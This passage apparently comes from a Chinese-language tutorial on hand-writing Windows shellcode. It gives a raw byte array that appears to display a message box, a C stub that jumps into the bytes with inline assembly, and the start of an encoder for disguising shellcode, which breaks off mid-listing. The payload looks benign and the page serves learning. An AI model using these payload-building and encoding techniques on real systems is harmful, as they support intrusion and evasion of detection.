number">90</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410200028694.png" alt="image-20220410200028694" /></p>
<p>获取它的 C 代码</p>
<p>010 中粘贴</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410200224997.png" alt="image-20220410200224997" /></p>
<p>复制为 C 代码</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">unsigned</span> <span class="token keyword">char</span> hexData<span class="token punctuation">[</span><span class="token number">169</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token number">0x90</span> </pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410200324171.png" alt="image-20220410200324171" /></p>
<p>代码编写</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">unsigned</span> <span class="token keyword">char</span> hexData<span class="token punctuation">[</span><span class="token number">169</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token number">0x90</span> </pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    _asm<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        lea eax<span class="token punctuation">,</span>hexData</pre></td></tr><tr><td data-num="30"></td><td><pre>            push eax</pre></td></tr><tr><td data-num="31"></td><td><pre>            ret</pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>编译运行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410200646846.png" alt="image-20220410200646846" /></p>
<p>f9 断点进反汇编</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410200734464.png" alt="image-20220410200734464" /></p>
<h2 id="shellcode编码变形技术"><a class="anchor" href="#shellcode编码变形技术">#</a> shellcode 编码变形技术</h2>
<h3 id="encode"><a class="anchor" href="#encode">#</a> encode</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span> </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span> </span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">char</span> hexData<span class="token punctuation">[</span><span class="token number">169</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span 